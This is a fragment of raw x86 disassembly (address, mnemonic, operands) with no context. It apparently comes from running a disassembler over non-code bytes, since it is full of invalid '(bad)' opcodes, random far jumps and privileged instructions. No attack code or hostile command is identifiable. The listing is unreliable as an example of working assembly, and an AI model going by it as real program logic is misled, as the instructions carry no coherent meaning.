  431aa3:	xor    bl,BYTE PTR [ecx]
  431aa5:	inc    eax
  431aa6:	stc    
  431aa7:	(bad)  
  431aa8:	jo     0x431a7d
  431aaa:	fadd   DWORD PTR [edx]
  431aac:	sbb    ebx,0x40e8c63c
  431ab2:	imul   esp,edx,0x7d4ac3d5
  431ab8:	(bad)  
  431ab9:	clc    
  431aba:	clc    
  431abb:	xor    esi,DWORD PTR [ebx-0x2e]
  431abe:	or     BYTE PTR ds:0xe8ce651,ch
  431ac4:	movaps XMMWORD PTR [ecx-0x79],xmm6
  431ac8:	mov    edi,0x7fef7c5d
  431acd:	jmp    0xf7b71d48
  431ad2:	sub    BYTE PTR ds:0xc267e514,ch
  431ad8:	(bad)  
  431ad9:	stc    
  431ada:	mov    dh,0xcb
  431adc:	enter  0x69ab,0x2
  431ae0:	xchg   DWORD PTR [edi+0x0],ebp
  431ae6:	add    BYTE PTR [esi-0x5a8dabcc],bl
  431aec:	rcl    BYTE PTR [eax+0x62],cl
  431aef:	test   dh,dh
  431af1:	fldcw  WORD PTR [edx]
  431af3:	jno    0x431ab6
  431af5:	push   edx
  431af6:	xchg   ecx,eax
  431af7:	lea    esp,[edi]
  431af9:	cld    
  431afa:	jle    0x431ac2
  431afc:	pop    eax
  431afd:	mov    BYTE PTR [ecx+eax*4],ch
  431b00:	clc    
  431b01:	mov    esi,0xbfe173f4
  431b06:	push   eax
  431b07:	cmp    al,0x31
  431b09:	cli    
  431b0a:	jmp    0xba904aeb
  431b0f:	add    eax,0xc3b907c7
  431b14:	sub    al,0x74
  431b16:	icebp  
  431b17:	dec    dh
  431b19:	cli    
  431b1a:	ror    DWORD PTR [ebx+0x2c],cl
  431b1d:	adc    al,0x65
  431b1f:	push   0x3163ffc2
  431b24:	mov    dh,0x3
  431b26:	das    
  431b27:	cmp    al,0x2c
  431b29:	add    BYTE PTR [eax+0x51],cl
  431b2c:	dec    ebx
  431b2d:	ds jmp 0xe0566c2a
  431b33:	sub    eax,0xc70051fd
  431b38:	sub    esp,DWORD PTR [esi+0x12]
  431b3b:	sbb    al,0x5
  431b3d:	dec    ebx
  431b3e:	mov    eax,0x39cf2c
  431b43:	aaa    
  431b44:	cli    
  431b45:	xor    ebx,esi
  431b47:	pop    edi
  431b48:	push   es
  431b49:	bound  eax,QWORD PTR [eax+eax*1]
  431b4c:	add    BYTE PTR [eax],al
  431b4e:	add    BYTE PTR [eax],al
  431b50:	pop    ds
  431b51:	cmp    dh,dl
  431b53:	lea    ebx,[ecx+0x12]
  431b56:	push   ecx
  431b57:	push   eax
  431b58:	arpl   cx,si
  431b5a:	rol    BYTE PTR [ebp-0x2069624],1
  431b60:	push   ecx
  431b61:	icebp  
  431b62:	dec    ecx
  431b63:	mov    eax,0x39cf00
  431b68:	ja     0x431b65
  431b6a:	xor    ebx,esi
  431b6c:	lahf   
  431b6d:	push   es
  431b6e:	bound  eax,QWORD PTR [edi+ebx*8]
  431b71:	cmp    edx,esi
  431b73:	lea    ebx,[ecx-0x5cafb012]
  431b79:	icebp  
  431b7a:	rcr    BYTE PTR [esi+0x61],1
  431b7d:	lds    esi,FWORD PTR [ebx+0x3]
  431b80:	dec    edx
  431b81:	cmp    dh,ch
  431b83:	inc    DWORD PTR [ecx]
  431b85:	icebp  
  431b86:	fiadd  WORD PTR [ebx-0x34]
  431b89:	lods   al,BYTE PTR ds:[esi]
  431b8a:	mul    ah
  431b8c:	fild   WORD PTR [edi+esi*8]
  431b8f:	jne    0x431ba5
  431b91:	pop    eax
  431b92:	loop   0x431b1a
  431b94:	inc    ebx
  431b95:	lock cmc 
  431b97:	test   BYTE PTR [edx+ebp*2-0x7],cl
  431b9b:	std    
  431b9c:	loope  0x431b8d
  431b9e:	cmc    
  431b9f:	xor    eax,0x39d99c
  431ba4:	add    al,0x5
  431ba6:	in     eax,0x43
  431ba8:	mov    edi,gs
  431baa:	jae    0x431ba4
  431bac:	xor    ebx,esp
  431bae:	popa   
  431baf:	test   DWORD PTR [ebx+0xc07ef0],0x0
  431bb9:	jne    0x431b49
  431bbb:	std    
  431bbc:	stc    
  431bbd:	mov    al,0x0
  431bbf:	neg    DWORD PTR [edx+edx*2-0x52]
  431bc3:	pop    ss
  431bc4:	push   0xfffe9975
  431bc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431bca:	cmp    BYTE PTR [edx+0x1220a2f7],dh
  431bd0:	js     0x431b59
  431bd2:	fld    DWORD PTR [ebx]
  431bd4:	jmp    0xfa7f6c3b
  431bd9:	out    dx,al
  431bda:	fidivr WORD PTR [ebx]
  431bdc:	push   esi
  431bdd:	sub    al,0x5c
  431bdf:	or     eax,DWORD PTR [eax]
  431be1:	lahf   
  431be2:	sbb    DWORD PTR [ebx],edi
  431be4:	xor    al,0x9
  431be6:	inc    esi
  431be7:	sar    bh,0x3
  431bea:	dec    edi
  431beb:	sbb    cl,BYTE PTR [edi]
  431bed:	mov    ch,0x19
  431bef:	xor    edx,edi
  431bf1:	mov    ds,WORD PTR [ecx+0x34]
  431bf4:	xlat   BYTE PTR ds:[ebx]
  431bf5:	mov    dh,0xf6
  431bf7:	mov    ch,BYTE PTR [ebx-0x67]
  431bfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431bfb:	jle    0x431be8
  431bfd:	jno    0x431c1a
  431bff:	(bad)  
  431c00:	jmp    FWORD PTR [ebx]
  431c02:	mov    dh,0xc2
  431c04:	arpl   WORD PTR ds:0x25e7c29e,sp
  431c0a:	pusha  
  431c0b:	ret    0x8d63
  431c0e:	sbb    esi,edi
  431c10:	push   DWORD PTR [edx+0x35101e2e]
  431c16:	sbb    DWORD PTR [ecx-0x76d9d741],eax
  431c1c:	je     0x431c1e
  431c1e:	add    BYTE PTR [eax],al
  431c20:	add    BYTE PTR [eax],al
  431c22:	lea    edx,[ecx+0x1992ff72]
  431c28:	shr    BYTE PTR es:[esi-0x10],cl
  431c2c:	cmp    al,0x86
  431c2e:	dec    eax
  431c2f:	mov    DWORD PTR [eax+eax*2],edx
  431c32:	jne    0x431bc0
  431c34:	shl    DWORD PTR [esi+0x3e80291],cl
  431c3a:	jne    0x431c0f
  431c3c:	aad    0x3c
  431c3e:	icebp  
  431c3f:	test   BYTE PTR [eax-0x4ed0a0c3],bl
  431c45:	ror    DWORD PTR [edi+0x58],cl
  431c48:	gs dec eax
  431c4a:	jle    0x431cc9
  431c4c:	arpl   WORD PTR [esp+edi*1-0x122c0ed1],si
  431c53:	mov    WORD PTR [eax+0x3d],?
  431c56:	das    
  431c57:	das    
  431c58:	loope  0x431c70
  431c5a:	fst    DWORD PTR [eax]
  431c5c:	sub    DWORD PTR [eax+edi*8],eax
  431c5f:	inc    ecx
  431c60:	pop    ebx
  431c61:	or     ebp,DWORD PTR [edx+0xcb3637d]
  431c67:	das    
  431c68:	shr    DWORD PTR [eax],0x73
  431c6b:	call   0x8664:0x27502e8
  431c72:	imul   BYTE PTR [edi]
  431c74:	test   eax,0xa1d2473c
  431c79:	push   ebp
  431c7a:	imul   eax,DWORD PTR [esi-0x14],0xffffff8e
  431c7e:	imul   edi,DWORD PTR [esi+0x50],0xe82eda73
  431c85:	sub    eax,DWORD PTR [eax]
  431c87:	add    BYTE PTR [eax],al
  431c89:	add    BYTE PTR [eax],al
  431c8b:	dec    ebx
  431c8c:	or     eax,DWORD PTR [edx+0x28b4f93c]
  431c92:	jl     0x431c99
  431c94:	add    ch,cl
  431c96:	add    ecx,ebp
  431c98:	lahf   
  431c99:	int    0x3c
  431c9b:	scas   eax,DWORD PTR es:[edi]
  431c9c:	jp     0x431cc8
  431c9e:	sar    ecx,cl
  431ca0:	les    ebp,FWORD PTR [ebx+edx*8-0x21]
  431ca4:	add    ebp,ecx
  431ca6:	add    esi,ebp
  431ca8:	jp     0x431ccb
  431caa:	sub    esp,DWORD PTR [esi]
  431cac:	inc    edi
  431cad:	inc    edx
  431cae:	cmp    al,0xfd
  431cb0:	les    ebx,FWORD PTR [esi+ecx*4+0x70ffea09]
  431cb7:	add    al,0x2f
  431cb9:	cli    
  431cba:	jmp    0x2659e15d
  431cbf:	test   eax,0x4699447e
  431cc4:	test   al,0x0
  431cc6:	fisub  DWORD PTR [eax+0x2a48cd3]
  431ccc:	mov    esi,0x9a037052
  431cd1:	mov    BYTE PTR [esi+eax*1+0x7b],bh
  431cd5:	je     0x431c58
  431cd7:	jns    0x431cef
  431cd9:	cmp    al,0xd9
  431cdb:	ss sub DWORD PTR cs:[ecx+0x248cfce4],0xffffffd1
  431ce4:	mov    ebp,0xf6346451
  431ce9:	dec    edi
  431cea:	pop    esp
  431ceb:	int3   
  431cec:	popf   
  431ced:	out    0xd5,eax
  431cef:	add    BYTE PTR [eax],al
  431cf1:	add    BYTE PTR [eax],al
  431cf3:	add    BYTE PTR [esi+0x7ad2fa2b],dh
  431cf9:	lods   eax,DWORD PTR ds:[esi]
  431cfa:	(bad)  
  431cfb:	mov    dh,0xf2
  431cfd:	xor    eax,0xf59235fa
  431d02:	rcr    DWORD PTR [edi],0x86
  431d05:	sar    dl,cl
  431d07:	adc    al,0x11
  431d09:	jg     0x431d87
  431d0b:	add    eax,0x8152300b
  431d10:	xchg   esi,eax
  431d11:	inc    edx
  431d12:	cli    
  431d13:	xchg   BYTE PTR [esi+0x579167b6],cl
  431d19:	xchg   ecx,eax
  431d1a:	cli    
  431d1b:	jbe    0x431d07
  431d1d:	(bad)  
  431d1e:	imul   esp,DWORD PTR [eax-0x4c],0xffffffcd
  431d22:	mov    esp,ds
  431d24:	mov    dh,0x75
  431d26:	scas   al,BYTE PTR es:[edi]
  431d27:	jmp    0x492b1fa2
  431d2c:	jnp    0x431d57
  431d2e:	cli    
  431d2f:	mov    edx,0x6f86fd
  431d34:	xor    ch,cl
  431d36:	cmc    
  431d37:	push   eax
  431d38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431d39:	pop    es
  431d3a:	lea    edi,[ebp-0x44]
  431d3d:	dec    ecx
  431d3e:	loop   0x431cf9
  431d40:	popf   
  431d41:	jmp    0x7aa7883b
  431d46:	inc    ebx
  431d47:	pop    esp
  431d48:	sbb    al,0x5f
  431d4a:	cld    
  431d4b:	mov    WORD PTR [ecx],es
  431d4d:	gs push edx
  431d4f:	call   0x38e508
  431d54:	jae    0x431dc9
  431d56:	lea    ax,[eax]
  431d59:	add    BYTE PTR [eax],al
  431d5b:	add    BYTE PTR [eax],al
  431d5d:	sbb    ecx,ebx
  431d5f:	cmc    
  431d60:	jne    0x431d1e
  431d62:	push   ecx
  431d63:	add    esi,0x50767397
  431d69:	(bad)  
  431d6a:	sub    dl,BYTE PTR [ecx-0x75]
  431d6d:	inc    edx
  431d6e:	(bad)  [esi+0x79e84383]
  431d74:	les    ecx,FWORD PTR [eax+ecx*2]
  431d77:	xchg   DWORD PTR [ebp-0x48],eax
  431d7a:	dec    ebp
  431d7b:	jns    0x431d75
  431d7d:	or     eax,0x78b8046a
  431d82:	add    DWORD PTR [eax],eax
  431d84:	add    BYTE PTR [esp+eax*4+0x4b13ff14],dh
  431d8b:	jns    0x431d52
  431d8d:	mov    BYTE PTR [edi+0x52cc04bc],bh
  431d93:	mov    eax,0xd9b0
  431d98:	push   esi
  431d99:	fs (bad) 
  431d9b:	pop    ebp
  431d9c:	inc    eax
  431d9d:	int3   
  431d9e:	dec    edi
  431d9f:	cmc    
  431da0:	adc    eax,0x401090
  431da5:	pop    ss
  431da6:	cli    
  431da7:	mul    esp
  431da9:	fild   WORD PTR [eax]
  431dab:	sti    
  431dac:	or     al,0x88
  431dae:	enter  0x39,0x75
  431db2:	cwde   
  431db3:	cmp    cl,BYTE PTR [ebx]
  431db5:	(bad)  
  431db6:	jecxz  0x431da1
  431db8:	retf   0x4eff
  431dbb:	add    esi,DWORD PTR [eax]
  431dbd:	gs pop ebx
  431dbf:	enter  0x74,0x0
  431dc3:	add    BYTE PTR [eax],al
  431dc5:	add    BYTE PTR [edx-0x1abbe6c],al
  431dcb:	in     eax,dx
  431dcc:	sub    ebx,0xffffff85
  431dcf:	sbb    dh,bh
  431dd1:	inc    esi
  431dd3:	xchg   ecx,eax
  431dd4:	outs   dx,BYTE PTR ds:[esi]
  431dd5:	add    al,0x75
  431dd7:	sbb    DWORD PTR [esi-0x1a624f9],esp
  431ddd:	mov    eax,?
  431ddf:	sub    eax,0x1242fa37
  431de4:	dec    esi
  431de5:	sbb    eax,0x98c353b
  431dea:	lds    esp,FWORD PTR [eax-0x7be2f841]
  431df0:	gs cld 
  431df2:	and    ah,BYTE PTR [ebp-0x3]
  431df5:	push   DWORD PTR [edi+0x19]
  431df8:	inc    BYTE PTR [ebp+esi*1-0x773202a]
  431dff:	ins    DWORD PTR es:[edi],dx
  431e00:	xor    eax,0xce0b02fa
  431e05:	dec    edi
  431e06:	call   0xf33e4de1
  431e0b:	pop    esp
  431e0c:	sub    ebx,DWORD PTR [ecx+0x18]
  431e0f:	cmp    BYTE PTR [bp+di+0x15b5],al
  431e14:	or     bl,bh
  431e16:	mov    ds:0xdd4f44a0,eax
  431e1b:	push   ds
  431e1c:	mov    bh,dl
  431e1e:	retf   0x190
  431e21:	das    
  431e22:	mov    ch,0xe0
  431e24:	inc    esi
  431e25:	mov    ebp,0x86c91971
  431e2a:	add    BYTE PTR [eax],al
  431e2c:	add    BYTE PTR [eax],al
  431e2e:	add    BYTE PTR [ecx+0x7437279a],ah
  431e34:	add    ch,cl
  431e36:	add    esi,DWORD PTR [edx]
  431e38:	aam    0xb1
  431e3a:	jl     0x431dc2
  431e3c:	add    ecx,ebp
  431e3e:	add    eax,DWORD PTR [edx+0x77]
  431e41:	push   eax
  431e42:	lods   al,BYTE PTR ds:[esi]
  431e43:	or     bh,BYTE PTR [eax+ebp*4+0x2c85f003]
  431e4a:	cmp    bh,BYTE PTR [edi+0x2b]
  431e4d:	cwde   
  431e4e:	inc    eax
  431e4f:	mov    ecx,0xa15b7f2a
  431e54:	jecxz  0x431e66
  431e56:	jb     0x431e4b
  431e58:	sub    bl,BYTE PTR [ecx]
  431e5a:	cmc    
  431e5b:	fs out dx,eax
  431e5d:	sub    BYTE PTR [esi-0xbeefa42],cl
  431e63:	(bad)  
  431e64:	hlt    
  431e65:	xor    al,0x3a
  431e67:	aas    
  431e68:	sub    ebp,DWORD PTR [eax+0x7c064284]
  431e6e:	add    eax,0xfca24262
  431e73:	sbb    esi,DWORD PTR [eax-0x3e1d0b30]
  431e79:	imul   ebp,DWORD PTR [esi+0x78f81a12],0xf
  431e80:	sub    esp,DWORD PTR [ebp-0x62]
  431e83:	push   es
  431e84:	add    dh,BYTE PTR [esi+edi*2+0x2e]
  431e88:	sub    al,0xb9
  431e8a:	cmp    BYTE PTR [edx-0x35d45589],ch
  431e90:	outs   dx,DWORD PTR ds:[esi]
  431e91:	stos   DWORD PTR es:[edi],eax
  431e92:	cmp    BYTE PTR [eax],al
  431e94:	add    BYTE PTR [eax],al
  431e96:	add    BYTE PTR [eax],al
  431e98:	test   BYTE PTR [ecx+0x1c],0xc0
  431e9c:	sti    
  431e9d:	inc    ebx
  431e9e:	nop
  431e9f:	sbb    ecx,DWORD PTR [edx]
  431ea1:	sub    eax,0x78e28c91
  431ea6:	adc    edi,DWORD PTR [ecx+esi*8]
  431ea9:	xor    eax,DWORD PTR [edx]
  431eab:	lock mov ebp,DWORD PTR [edx+esi*8]
  431eaf:	repz xchg ebx,eax
  431eb1:	sub    al,0xff
  431eb3:	sbb    eax,0x5c07b66c
  431eb8:	jmp    0x431edc
  431eba:	out    0xbc,eax
  431ebc:	sbb    eax,0x3665fa28
  431ec1:	scas   eax,DWORD PTR es:[edi]
  431ec2:	sbb    edx,ebp
  431ec4:	retf   
  431ec5:	add    al,BYTE PTR [edi+0x7c7da527]
  431ecb:	push   ecx
  431ecc:	dec    esi
  431ecd:	fsubr  DWORD PTR [esi-0x4080c2c4]
  431ed3:	mov    ebp,0x41f2817a
  431ed8:	not    BYTE PTR [edi-0x4]
  431edb:	es icebp 
  431edd:	scas   al,BYTE PTR es:[edi]
  431ede:	not    DWORD PTR [edx]
  431ee0:	push   0x9e017477
  431ee5:	cwde   
  431ee6:	lods   eax,DWORD PTR ds:[esi]
  431ee7:	or     al,0x8d
  431ee9:	fdiv   st,st(1)
  431eeb:	call   0x2c82:0xffcb7efb
  431ef2:	gs jmp 0x99574c3e
  431ef8:	test   dl,al
  431efa:	jmp    FWORD PTR [ecx+0x0]
  431efd:	add    BYTE PTR [eax],al
  431eff:	add    BYTE PTR [eax],al
  431f01:	mov    ch,0xfd
  431f03:	pop    edx
  431f04:	jb     0x431f61
  431f06:	retf   
  431f07:	push   esi
  431f08:	mov    al,ds:0x340005b7
  431f0d:	(bad)  
  431f0e:	sbb    eax,0xfe81d580
  431f13:	(bad)  
  431f14:	call   0x4395f340
  431f19:	aad    0x21
  431f1b:	lahf   
  431f1c:	pop    ebx
  431f1d:	mov    ds:0xdec22e2c,al
  431f22:	push   0x19eff073
  431f27:	out    0x67,eax
  431f29:	scas   eax,DWORD PTR es:[edi]
  431f2a:	sub    edi,edx
  431f2c:	xor    BYTE PTR [edi-0x27],0xbf
  431f30:	add    BYTE PTR [edi],ch
  431f32:	mov    ds:0x2ccc43db,al
  431f37:	mov    ecx,0xfaf0200f
  431f3c:	call   FWORD PTR [esi+ebx*4+0x5cfde1a]
  431f43:	test   eax,0x58be0
  431f48:	mov    eax,cr4
  431f4b:	cli    
  431f4c:	call   FWORD PTR [esi+edx*4+0x58c07fa]
  431f53:	je     0x431f80
  431f55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431f56:	mov    eax,ds:0xdd5cffff
  431f5b:	pop    edi
  431f5c:	xchg   edx,eax
  431f5d:	fwait
  431f5e:	icebp  
  431f5f:	xor    ebx,eax
  431f61:	add    BYTE PTR [esi],cl
  431f63:	div    DWORD PTR ds:0x0
  431f69:	add    BYTE PTR [eax-0x1e],bh
  431f6c:	cmp    DWORD PTR [eax],eax
  431f6e:	xlat   BYTE PTR ds:[ebx]
  431f6f:	out    dx,al
  431f70:	loop   0x431f5f
  431f72:	dec    ebx
  431f73:	out    dx,eax
  431f74:	cmc    
  431f75:	mov    edi,DWORD PTR [esp+ebx*8]
  431f78:	cld    
  431f79:	xor    al,BYTE PTR [edx-0x62]
  431f7c:	sahf   
  431f7d:	fstp   st(7)
  431f7f:	add    al,0xe8
  431f81:	cli    
  431f82:	js     0x431f6f
  431f84:	cmc    
  431f85:	not    BYTE PTR [ecx]
  431f87:	and    eax,0x250c43d8
  431f8c:	outs   dx,BYTE PTR ds:[esi]
  431f8d:	or     ebx,DWORD PTR [ecx+0x3bfa46aa]
  431f93:	lock loop 0x431fac
  431f96:	cmp    dh,al
  431f98:	cmc    
  431f99:	not    DWORD PTR [ecx]
  431f9b:	and    eax,0x4dc43d8
  431fa0:	add    DWORD PTR [eax],eax
  431fa2:	fcomp  QWORD PTR [eax+0x9]
  431fa5:	mov    ebx,ecx
  431fa7:	enter  0x43db,0xcc
  431fab:	push   ebx
  431fac:	dec    ecx
  431fad:	push   0x3e105275
  431fb2:	jne    0x431fa0
  431fb4:	sub    eax,esi
  431fb6:	pop    ds
  431fb7:	xor    DWORD PTR [ecx],0x543b70f1
  431fbd:	ds jne 0x431f9b
  431fc0:	scas   eax,DWORD PTR es:[edi]
  431fc1:	dec    ebx
  431fc2:	pop    ds
  431fc3:	inc    edi
  431fc4:	es cld 
  431fc6:	add    al,0xa0
  431fc8:	xor    DWORD PTR [edx-0x41b42b],edi
  431fce:	add    BYTE PTR [eax],al
  431fd0:	add    BYTE PTR [eax],al
  431fd2:	add    BYTE PTR [edi-0x24],cl
  431fd5:	stos   BYTE PTR es:[edi],al
  431fd6:	or     edi,esp
  431fd8:	adc    cl,BYTE PTR [edi+edx*2+0x7d6b279]
  431fdf:	out    dx,al
  431fe0:	jmp    0xa363:0xe7a7fd25
  431fe7:	dec    eax
  431fe8:	pop    ebp
  431fe9:	(bad)  
  431fea:	out    0xb,eax
  431fec:	mov    esi,0x15cffa37
  431ff1:	es aam 0xe4
  431ff4:	adc    BYTE PTR [edx],dh
  431ff6:	ss mov es,WORD PTR ss:[edi]
  431ffa:	mov    DWORD PTR [ebp-0x29],edi
  431ffd:	mov    esi,0xd6b27403
  432002:	pop    es
  432003:	(bad)  
  432004:	sub    DWORD PTR [eax],ebp
  432006:	std    
  432007:	addr16 das 
  432009:	pop    esi
  43200a:	mov    ds:0xe803dd40,eax
  43200f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432010:	gs xor bh,dl
  432013:	or     edx,DWORD PTR [edi]
  432015:	fcompp 
  432017:	mov    dh,0x19
  432019:	jle    0x43208e
  43201b:	js     0x43206e
  43201d:	stos   DWORD PTR es:[edi],eax
  43201e:	xor    bl,bh
  432020:	push   0xe57d5cfb
  432025:	fiadd  WORD PTR [esi+0x3e527da0]
  43202b:	jne    0x43202f
  43202d:	xchg   ecx,eax
  43202e:	push   cs
  43202f:	inc    edx
  432030:	sub    BYTE PTR [ecx+0x25461663],bl
  432036:	add    al,0x0
  432038:	add    BYTE PTR [eax],al
  43203a:	add    BYTE PTR [eax],al
  43203c:	repnz xor cl,ch
  43203f:	inc    eax
  432040:	inc    esi
  432041:	sti    
  432042:	nop
  432043:	cwde   
  432044:	sbb    eax,0x9ace7928
  432049:	pop    esi
  43204a:	push   edi
  43204b:	xor    eax,0xd90ac7af
  432050:	lods   eax,DWORD PTR ds:[esi]
  432051:	inc    esp
  432052:	in     al,dx
  432053:	add    eax,DWORD PTR [eax+0x7b]
  432056:	dec    esp
  432057:	sbb    DWORD PTR [esi+0x7503e6f6],0x75
  43205e:	mov    ds:0xbb27250b,eax
  432063:	or     esi,DWORD PTR [edi+0x6e0439bd]
  432069:	or     eax,0x2b51469
  43206e:	fs inc esp
  432070:	out    0x99,al
  432072:	mov    ch,0xcc
  432074:	pop    edi
  432075:	lods   eax,DWORD PTR ds:[esi]
  432076:	lock js 0x4320ef
  432079:	add    ecx,ebp
  43207b:	add    ebx,ebp
  43207d:	ficomp DWORD PTR [ecx-0x3c]
  432080:	inc    edx
  432081:	jbe    0x4320c6
  432083:	xor    BYTE PTR [ecx],bh
  432085:	daa    
  432086:	stc    
  432087:	sub    edx,esi
  432089:	xor    ecx,0x63c9cd34
  43208f:	inc    esp
  432090:	pushf  
  432091:	call   0xc23284e6
  432096:	call   0x91155823
  43209b:	add    DWORD PTR [ebp+0x2],esi
  43209e:	imul   ebp,DWORD PTR [ebx],0x0
  4320a4:	add    BYTE PTR [ebx],ch
  4320a6:	inc    esp
  4320a7:	ret    0xf134
  4320aa:	inc    ecx
  4320ab:	xor    al,0xec
  4320ad:	jae    0x4320d9
  4320af:	push   DWORD PTR [ebp-0x5978f7e6]
  4320b5:	(bad)  
  4320b6:	sub    edx,DWORD PTR [ecx+ecx*1]
  4320b9:	test   dl,al
  4320bb:	(bad)  
  4320bc:	cmp    DWORD PTR [eax-0x769df452],ecx
  4320c2:	mov    bh,0xfa
  4320c4:	hlt    
  4320c5:	(bad)  
  4320c6:	adc    DWORD PTR [eax-0x17],eax
  4320c9:	scas   al,BYTE PTR es:[edi]
  4320ca:	jne    0x432112
  4320cc:	jle    0x43207b
  4320ce:	ds adc eax,0x876760a9
  4320d4:	and    al,0x68
  4320d6:	sub    al,0x74
  4320d8:	icebp  
  4320d9:	popa   
  4320da:	push   cs
  4320db:	mov    bl,bh
  4320dd:	mov    dh,0x26
  4320df:	pop    ecx
  4320e0:	mov    dl,0xfc
  4320e2:	mov    ebp,0xff3420fa
  4320e7:	call   FWORD PTR [ebx+0x457e1aed]
  4320ed:	scas   al,BYTE PTR es:[edi]
  4320ee:	lahf   
  4320ef:	dec    BYTE PTR [edi+0x2ef25d9e]
  4320f5:	test   eax,0x869dbf81
  4320fa:	pushf  
  4320fb:	call   DWORD PTR [eax]
  4320fd:	push   ebp
  4320fe:	sub    al,0xfa
  432100:	push   ss
  432101:	sahf   
  432102:	jl     0x43209c
  432104:	push   cs
  432105:	mov    DWORD PTR [ebp+0x0],edx
  432108:	adc    al,BYTE PTR [eax]
  43210a:	add    BYTE PTR [eax],al
  43210c:	add    BYTE PTR [eax],al
  43210e:	je     0x4320e4
  432110:	mov    edi,0xbec69372
  432115:	add    ebp,eax
  432117:	sub    dl,bh
  432119:	out    dx,al
  43211a:	mov    ds:0xfb0f7365,eax
  43211f:	and    eax,0xf82af4f9
  432124:	aas    
  432125:	jmp    0xe998d7c3
  43212a:	jbe    0x4320cc
  43212c:	cmp    BYTE PTR [eax],al
  43212e:	add    al,0x6b
  432130:	push   cs
  432131:	mov    esp,DWORD PTR [edx+esi*1+0x51dd3c7f]
  432138:	inc    ebx
  432139:	add    ah,cl
  43213b:	push   0x2
  43213d:	mov    esp,DWORD PTR [eax+0x40327ff]
  432143:	repnz fbstp TBYTE PTR [ebx]
  432146:	sbb    al,0xbe
  432148:	loop   0x4320eb
  43214a:	repz icebp 
  43214c:	cmc    
  43214d:	xor    ecx,DWORD PTR [edi*4-0x5a760002]
  432154:	out    0x83,al
  432156:	lock xchg BYTE PTR [ecx+0x56],cl
  43215a:	fidiv  WORD PTR [ebp+eax*1-0x37bc04a]
  432161:	mov    ecx,ds
  432163:	jns    0x4321af
  432165:	lea    ebp,[eax-0x55]
  432168:	mov    esi,0xf701cc8f
  43216d:	ss and al,0x33
  432170:	idiv   edi
  432172:	add    BYTE PTR [eax],al
  432174:	add    BYTE PTR [eax],al
  432176:	add    BYTE PTR [ebx+0xc984383],dh
  43217c:	or     eax,edx
  43217e:	lods   al,BYTE PTR ds:[esi]
  43217f:	xchg   ecx,eax
  432180:	icebp  
  432181:	jle    0x432143
  432183:	stc    
  432184:	sbb    DWORD PTR [ecx+eax*1-0x1f],esp
  432188:	cmp    edx,DWORD PTR [edx-0x1dd79cb0]
  43218e:	and    esp,DWORD PTR [ebp-0xf]
  432191:	cmc    
  432192:	lea    ecx,[ecx]
  432194:	jns    0x4321e0
  432196:	call   0x3ec406
  43219b:	cwde   
  43219c:	mov    esi,0xbc120b73
  4321a1:	jp     0x43219e
  4321a3:	or     DWORD PTR [edi-0x4f],ebp
  4321a6:	pop    esi
  4321a7:	mov    bh,0xe7
  4321a9:	mov    ecx,0x191a75b0
  4321ae:	imul   DWORD PTR [eax+0x117e1aa0]
  4321b4:	inc    ebx
  4321b5:	sub    ebx,0xffffff99
  4321b8:	xor    dh,bh
  4321ba:	inc    DWORD PTR [esi+0x5]
  4321bd:	xlat   BYTE PTR ds:[ebx]
  4321be:	cli    
  4321bf:	test   al,0xd7
  4321c1:	dec    ebp
  4321c2:	ds jne 0x432173
  4321c5:	mov    dl,0x23
  4321c7:	jno    0x432226
  4321c9:	ret    0x6623
  4321cc:	sbb    edx,DWORD PTR [esi]
  4321ce:	adc    al,0xd3
  4321d0:	jae    0x4321ff
  4321d2:	xor    DWORD PTR [ebp+0x3986e026],0x3f
  4321d9:	or     bh,bl
  4321db:	add    BYTE PTR [eax],al
  4321dd:	add    BYTE PTR [eax],al
  4321df:	add    BYTE PTR [ecx],ah
  4321e1:	aaa    
  4321e2:	push   es
  4321e3:	lea    ebp,[ecx]
  4321e5:	aas    
  4321e6:	adc    cl,BYTE PTR [ecx-0x17e808cf]
  4321ec:	data16 (bad) 
  4321ee:	sub    eax,0x7bd2fefa
  4321f3:	jnp    0x43224e
  4321f5:	das    
  4321f6:	xchg   edx,edi
  4321f8:	add    BYTE PTR [edi],dl
  4321fa:	jecxz  0x43223f
  4321fc:	cdq    
  4321fd:	dec    ecx
  4321fe:	jg     0x432243
  432200:	xchg   ecx,eax
  432201:	push   ecx
  432202:	push   ss
  432203:	adc    BYTE PTR [ebx-0x2b],0x2d
  432207:	out    0x71,al
  432209:	mov    al,0xaa
  43220b:	and    ebp,DWORD PTR [ecx-0x66]
  43220e:	stos   BYTE PTR es:[edi],al
  43220f:	and    esp,DWORD PTR [ebp-0x5]
  432212:	add    eax,DWORD PTR [eax]
  432214:	jne    0x43225a
  432216:	xchg   DWORD PTR [edx],esp
  432218:	je     0x432233
  43221a:	(bad)  
  43221b:	push   edx
  43221c:	sbb    eax,0x2afc4ec9
  432221:	xchg   esi,eax
  432222:	ds or  bh,cl
  432225:	mov    BYTE PTR [eax+eax*1],0x75
  432229:	add    cl,BYTE PTR [edi+0x3]
  43222c:	add    BYTE PTR [edi-0x654557fc],bh
  432232:	sbb    BYTE PTR [ebx],dl
  432234:	in     eax,0xea
  432236:	rol    BYTE PTR [ebx+0x7fc12402],0x36
  43223d:	fimul  WORD PTR [eax-0x2c]
  432240:	push   eax
  432241:	add    DWORD PTR [ecx-0x34],eax
  432244:	add    BYTE PTR [eax],al
  432246:	add    BYTE PTR [eax],al
  432248:	add    BYTE PTR [edi+edi*4-0x1d7ecf18],bh
  43224f:	cmc    
  432250:	ret    
  432251:	sar    BYTE PTR [eax-0x68],cl
  432254:	xchg   esp,eax
  432256:	rep ins BYTE PTR es:[edi],dx
  432258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432259:	shl    BYTE PTR [ebx],0xe8
  43225c:	xor    BYTE PTR [ecx-0xa],ah
  43225f:	aad    0xc3
  432261:	mov    dl,0x78
  432263:	fild   DWORD PTR [edi]
  432265:	jp     0x432229
  432267:	call   0xe9460a5a
  43226c:	add    esp,DWORD PTR [eax]
  43226e:	std    
  43226f:	mov    edx,0x52efc330
  432274:	xchg   DWORD PTR [ebx+esi*8+0x2380c46c],eax
  43227b:	call   0x4383eb9b
  432280:	xor    DWORD PTR [edx],ebx
  432282:	loop   0x432238
  432284:	or     dl,ch
  432286:	cmc    
  432287:	or     BYTE PTR [edx-0x5d],dl
